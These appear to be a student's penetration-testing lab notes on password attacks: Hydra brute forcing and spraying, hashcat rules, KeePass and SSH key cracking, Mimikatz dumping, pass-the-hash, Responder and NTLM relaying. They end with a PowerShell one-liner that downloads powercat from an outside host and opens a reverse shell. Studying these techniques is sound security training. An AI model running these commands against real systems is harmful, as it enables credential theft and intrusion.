# Attacking Network Services Logins
## SSH and RDP
- THC Hydra
	- Network Password Cracking
	-Uncompress zip
		- gzip -d
	- hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201
		- -l = username
		- -P = password list
		- -s = port
		- ssh://$ip = tgt
- ScatteredSecrets
	- track password leaks and compromises and sells plaintext passwords
- WeLeakInfo
	- siezed by the FBI & DOJ
- Password Spraying:
	- hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202
		- -L = list of usernames
		- -p = password
		- rdp: = protocol 
- ex:
	- ftp $ip
	- ftp username@$ip
	- scp user@ip:/dir/file /home/kali
	- scp /home/kali/file user@ip:/tmp/file

### HTTP POST Login Form
- Must Have
	- 1 request body
		- i.e. [fm usr=user& fm pwd=password]
	- 1 failed post response indicator (condition string)
		- "Login failed. Invalid username or password"
	- hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
		- -l username
		- -P password list
		- http-post-form
		- [location:login post request body:failed response indicator]
			- failed response indicator shortened to not get false positives
- Brute Force Protection
	- WAF
	- fail2ban
- http-get
- hydra -l admin -P /usr/share/wordlists/rockyou.txt  [$IP] http-get /webpage/
	- or http-get [blank]

## Encryption, Hashing, and Cracking

- sha256sum
	- hash things
	- echo -n
		- strip newline so it doesnt effect hash
- John the Ripper (JtR)
	- CPU-based
		- bcrypt algorithm better
- Hashcat
	- GPU-based
		- thousands of cores
	- faster
	- requires OpenCL or CUDA for GPU cracking process
	- hashcat -b
		- benchmark mode
	- hashcat --show [hash]
		- display already cracked hash
### Mutating Wordlists
- sed
	- sed -i '/^1/d' demo.txt
		- deletes all lines starting with 1
- <�A HREF="https://www.exploit-db.com/google-hacking-database">Google Hacking DB<�/A>Hashcat Wiki
	- list of all rule functions
- Hashcat rules
	- $
		- append
	- ^
		- prepend
	- c
		- Capitalize 1st word, lowercase the rest
	- u
		- makes all letters uppercase
	- d
		- duplicates the passwords
	- example:
		- hashcat -r demo.rule --stdout demo.txt
			- -r = rule list
			- --stdout = dont crack hash, just print
		- demo.rule
			- $1 c $!
				- append 1, capitalize first, lowercase rest, append !
- Hashcat example:
	- hashcat -m 0 crackme.txt /usr/share/wordlists/rockyou.txt -r demo3.rule --force
		- -m = hash type
			- 0 = MD5
		- -r = rules
		- --force = ignore warnings
- Password guessing hints (most users)
	- use a main word
	- usually capitalize first letter
	- add special character at the end
		- usually on the left side
- Hashcat's premade rules
	- /usr/share/hashcat/rules/

#### Cracking Methodology
1. Extract hashes
2. Format hashes
		- double check algo with multiple tools
	- hash-identifier
	- or hashid
4. Calculate the cracking time
	- keyspace / hash rate = time (s)
5. Prepare wordlist
6. Attack the hash

### Password Manager
Examples: 1Password & KeePass
- locate password manager
- locate database file in Powershell
	- Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
		- -Path = to search whole drive
		- -include = file type
		- -File = list of files
- John the Ripper (JtR)
	- has various transformation scripts
		- ssh2john
		- keepass2john
			- keepass2john Database.kdbx > keepass.hash
			- cat keepass.hash
				- remove prepended string
			- hashcat --help | grep -i "KeePass"
			- hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
				- **rockyou-30000.rule** = hashcats rockyou rule list
- Impacket
	- smb share
		- [transfer files windows <--> kali]
	- [Kali] impacket-smbserver share_name share_folder -smb2support -username User -password Pass
		- specific ex:
			- impacket-smbserver share /home/tristan/ -smb2support -username kali -password kali
	- [Windows] net use \\10.10.10.10\share /u:user password

### SSH Private Key Passphrase
- Example:
	- chmod 600 id_rsa
	- ssh -i id_rsa -p 222 dave@192.168.50.201
	- ssh2john id_rsa > ssh.hash
		- $6 in hash = SHA-512
	- hashcat -m 22921 ssh.hash ssh.passwords -r ssh.rule --force
		- has aes-256-ctr cipher
		- JtR supports the cipher
	- JtR
		- edit rule list
			- /etc/john/john.conf
			- cat ssh.rule
			- ```
				[List.Rules:sshRules]
				c $1 $3 $7 $!
				c $1 $3 $7 $@
				c $1 $3 $7 $#
					```
			- sudo sh -c  'cat /home/kali/passwordattacks/ssh.rule >> /etc/john/john.conf'
				- sh -c append the contents 
			- john --wordlist=ssh.passwords --rules=sshRules ssh.hash
### Cracking NTLM
		- some credentials stored when a service is run with a user account
- Stored in SAM (Security Account Manager)
	- Location: C:\Windows\system32\config\sam
- Mimikatz
	- extracts passwords & hashes from various sources
	- sekurlsa module
		- extracts passwords from LSASS (Local Security Authority Subsystem)
			- LSASS caches NTLM hashes & credentials
				- needs to be run as SYSTEM user
	- Can only run as Admin
	- Needs [SeDebugPriveledge] enabled
		- allows debugging of other users' processes
	- token elevation function
		- elevates privileges
		- requires [SeImpersonateaPrivilege]
			- all local admins have it by default
- PsExec tool
	- privilege escalation 

- Example:
	- Get-LocalUser
	- **C:\tools\mimikatz.exe**
	- cd C:\tools
	- [.\mimikatz.exe]
		- must run Powershell as admin
		- Commands:
			- privilege::debug
				- enables [SeDebugPrivilege]
				- required for sekurlsa::logonpasswords and lsadump::sam
			- sekurlsa::logonpasswords
				- extracts all plaintext and hashed passwords from all sources
				- generates alot of output
			- lsadump::sam
				- extracts NTLM hashes from SAM
			- token::elevate
				- elevate to SYSTEM user privileges
		1. privilege::debug
		2. token::elevate
		3. lsadump::sam
		4. Then crack
			- hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
### Passing NTLM
- NTLM passwords not salted & are static between sessions
- On used as local admin account
	- other accounts in local admin group need to change UAC

- Tools that support authentication with NTLM hashes
	- SMB enumeratison
		- smbclient
		- CrackMapExec
	- Command execution
		- impacket
			- psexec.py
			- wmiexec.py
- Can use NTLM hashes to connect with SMB, RDP, and WinRM, and Mimikatzs
- Example:
	- Gain access to an SMB by providing NTLM hash
		- ```
			smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
					```
			- -U = user
			- --pw-nt-hash = indicating the hash
		- After connecting
			- >dir
			- >get secrets.txt
		- Using psexec.py
			- searches for a writable share and uploads an executable file to it. Then registers exe as Windows service & starts
		- Using impacket-scripts to execute psexec.py
				- user friendly
				- upload .exe
				- leaves logs
			- impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
				- -hashes = hash
					- format = "LMHash:NTHash"
					- since we only use NTLM hash
						- fill LMHash section with (32) 0's
					- then username@ip
					- then command to execute
						- default or blank = cmd.exe
				- shell is always a SYSTEM user
		- impacket-wmiexec
			- doesnt write to disk
			- can be used with pth-wmis for remote acces
			- ```
				impacket-wmiexec -hashes 00000000000000000000000000000000: 2a944a58d4ffa77137b2c587e6ed7626 maria@192.168.210.70
				``
### Cracking Net-NTLMv2
			- Since we don't have privileges to run Mimikatz, we cannot extract passwords from the system. But we can set up an SMB server with Responder on our Kali machine, then connect to it with the user _paul_ and crack the Net-NTLMv2 hash
- Net-NTLMv2
	- netowrk protocol
	- can be abused if unprivileged user
		- cant run Mimikatz
	- PtH attacks
- Responder
	- built in SMB server that catches authentification
	- prints all captured Net-NTLMv2 hashes
	- can include HTTP, FTP, LLMNR (Link-Local Multicast Name Resolution), NBT-NS (NetBIOS Name Service), and MDNS (Multicast DNS) poisoning capablities.

	- Force tgt machine to authenticate with owned system
		- SMB
			- [PowerShell] **ls \\192.168.119.2\share**
				- or
			- **\\192.168.119.2\share\nonexistent.txt**
				- on Webpage for file upload
				- [MUST USE escape characters]
					- i.e. 4x \\ and 2x \
	- Example:

		1. nc 192.168.50.211 4444
			- bind shell
		2. whoami
		3. net user paul
			- part of the RDP group but not Admin
		4. ip a
			- retrieve a list of all interfaces
		5. sudo responder -I tap0 
			1. -I = listening interface 
		6. dir **\\192.168.119.2\test**
			- request access to a non-existent SMB share on our Responder SMB server using pauls bind shell
		7. cat paul.hash
		8. hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force
			- crack the hash
		9.

### Relaying Net-NTLMv2
- If not a local Admin user, UAC must be disabled

- impacket-ntlmrelayx
	- impacket library
	- sets up an SMB server and relays the authentification part
	- Example:
		- impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershell -enc JABjAGwAaQBlAG5...."
			- --no-http-server = disable HTTP server since we're relaying SMB connection
			- -t = target
			- -c = command to execute
			- -enc = base64 encoded
			- [-i] = [interactive mode]
		- nc -lvnp 8080
			- catch reverse shell on SYS2
		- nc 192.168.50.211 5555
			- connect to bind shell on SYS1
		- dir \\192.168.119.2\test
			- create SMB connection to Kali machine
		- powershell reverse shell one liner
			- powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.145.245:8000/powercat.ps1');
powercat -c 192.168.45.245 -p 4444 -e powershell"

- or 
	- -c "net user Administrator Password123#"
